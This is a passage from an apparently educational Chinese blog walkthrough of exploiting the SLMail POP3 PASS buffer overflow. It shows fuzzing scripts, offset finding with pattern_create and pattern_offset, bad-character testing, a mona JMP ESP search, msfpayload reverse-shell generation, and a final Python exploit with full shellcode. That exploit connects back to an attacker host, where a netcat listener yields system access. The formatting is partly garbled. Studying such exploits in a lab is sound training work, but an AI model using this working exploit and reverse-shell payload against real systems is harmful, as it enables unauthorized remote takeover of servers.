class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span>*counter)</span><br><span class="line">    counter = counter + <span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes "</span> % len(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">"USER test"</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + string + <span class="string">'\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#向目标的110端口发送大量的A</span></span><br></pre></td></tr></table></figure></li><li><p>首先确保开启了pop3：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/49054008.jpg" alt=""></p></li><li><p>打开ImmunityDebugger并且开始调试pop3服务的这个进程，查看端口状态的时候可以看到PID是2696<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/51147695.jpg" alt=""><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/87550059.jpg" alt=""></p></li><li><p>准备就绪以后启动脚本发送数据：</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/83362379.jpg" alt=""></p></li><li><p>当数据到2700bytes的时候会发现EIP EBP寄存器都是4141 assic码就是A，这个时候发送大量的A造成了PASS指定的溢出，证明溢出确实存在：</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/89254562.jpg" alt=""></p></li><li><p>溢出存在，如果EIP指令可以修改，就可以通过一些构造，就可能执行一些系统命令；还有一种可能，通过修改EIP的地址，将指令指向一个内存地址空间，通过缓冲区溢出添加shellcode，然后控制服务器。</p></li></ul></li><li><p>通过PASS缓冲区溢出漏洞的验证，发现在数据发送到2900bytes的时候溢出</p><ul><li><p>通过第三个脚本精确的找到溢出的四个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2700</span>     <span class="comment">#因为前面是从2700开始溢出的</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2600</span>     <span class="comment">#改为2800确定是否在 2800-2900之间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure></li><li><p>现在再看POP3的进程，仅管还是溢出了，但是EIP不是全A的状态了，就证明精确溢出的四个字节在2600-2700：</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65934922.jpg" alt=""></p></li><li><p>更加精确定位</p><ul><li><p>二分法</p></li><li><p>唯一字符串法：如果可以生成唯一的字符串，就可以精确定位是那四个字节填充了EIP</p><ul><li><p>通过一个脚本生成</p><figure class="highlight plain"><figcaption><span>/usr/share/metasploit-framework/tools/exploit/```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)</span><br><span class="line"></span><br><span class="line">- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)</span><br><span class="line"></span><br><span class="line">- EIP中的四个字节的HEX为：39 69 44 38  由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9</span><br><span class="line"></span><br><span class="line">- 使用脚本查看着四个字节的偏移量：</span><br><span class="line"></span><br><span class="line">  ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)</span><br><span class="line"></span><br><span class="line">- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80</span><br><span class="line">  try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521642331693.png" alt="52164233169"></p></li><li><p>通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。</p></li></ul></li></ul></li></ul></li><li><p>现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行</p><ul><li><p>寻找可存放shellcode的内存空间</p></li><li><p>通过脚本来探测ESP寄存器的大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">890</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span>![](http://demos-qq.oss-cn-beijing.aliyuncs.com/<span class="number">18</span><span class="number">-3</span><span class="number">-22</span>/<span class="number">9248235.j</span>pg)</span><br></pre></td></tr></table></figure><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg" alt=""></p></li><li><p>然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode）<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/79008411.jpg" alt=""></p></li><li><p>由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途</p><ul><li><p>返回地址、shellcode、buffer都不能出现坏字符</p></li><li><p>null byte (0x00) 空字符、用于终止字符串的拷贝操作</p></li><li><p>return （0x0D）回车操作，表示POP3 PASS命令输入完成</p></li><li><p>思路：发送0x00——0xff 256个字符，查找所有坏字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line"><span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line"><span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span></span><br><span class="line">)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21611430.jpg" alt=""></p></li><li><p>这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00</p></li></ul></li><li><p>理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路：</p><ul><li><p>在内存中寻找地址固定的系统模块</p></li><li><p>在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</p></li><li><p>mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块</p></li><li><p>寻找无DEP、ALSR保护的内存地址</p></li><li><p>内存地址不含坏字符</p></li><li><p>配置好调试工具，启动mono脚本：<figure class="highlight plain"><figcaption><span>modules```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg)</span><br><span class="line"></span><br><span class="line">  我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数</span><br><span class="line"></span><br><span class="line">  rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的</span><br><span class="line"></span><br><span class="line">  safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。</span><br><span class="line"></span><br><span class="line">  OS dll表示每个操作系统都有的这里都选为TRUE</span><br><span class="line"></span><br><span class="line">- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</span><br></pre></td></tr></table></figure></p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/28063784.jpg" alt=""></p></li><li><p>很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：<figure class="highlight plain"><figcaption><span>-s "\xff\xe4" -m slmfc.dll```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)</span><br><span class="line"></span><br><span class="line">- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转）</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中</span><br><span class="line"></span><br><span class="line">  - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg)</span><br><span class="line"></span><br><span class="line">  - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造：</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390</span><br><span class="line">    try:</span><br><span class="line">        print &quot;\nSending evil buffer...&quot;</span><br><span class="line">        s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">        print &quot;\nDone!&quot;</span><br><span class="line">    except:</span><br><span class="line">        print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></p><ul><li><p>然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode）</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/73683041.jpg" alt=""></p><p>按F7执行下一步，发现又跳转到EIP：</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21013466.jpg" alt=""></p></li></ul></li></ul></li><li><p>现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制：</p><ul><li><p>生成shellcode</p></li><li><p>scratch  （可以用这个去自己写）</p></li><li><p>用msfpayload生成shellcode</p><ul><li><figure class="highlight plain"><figcaption><span>-l``` 查看所有的payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C```  用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用</span><br><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;```   这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)</span><br><span class="line"></span><br><span class="line">- 将shellcode加入代码中：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  shellcode = (</span><br><span class="line">  &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; +</span><br><span class="line">  &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; +</span><br><span class="line">  &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; +</span><br><span class="line">  &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; +</span><br><span class="line">  &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; +</span><br><span class="line">  &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; +</span><br><span class="line">  &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; +</span><br><span class="line">  &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; +</span><br><span class="line">  &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; +</span><br><span class="line">  &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; +</span><br><span class="line">  &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; +</span><br><span class="line">  &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; +</span><br><span class="line">  &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; +</span><br><span class="line">  &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; +</span><br><span class="line">  &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; +</span><br><span class="line">  &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; +</span><br><span class="line">  &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; +</span><br><span class="line">  &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode</span><br><span class="line">  try:                </span><br><span class="line">      #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>现在我们监听本地的4444端口，等待反向连接</p><figure class="highlight plain"><figcaption><span>nc -vlp 4444```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg)</span><br><span class="line"></span><br><span class="line">  - 执行系统命令：</span><br><span class="line"></span><br><span class="line">    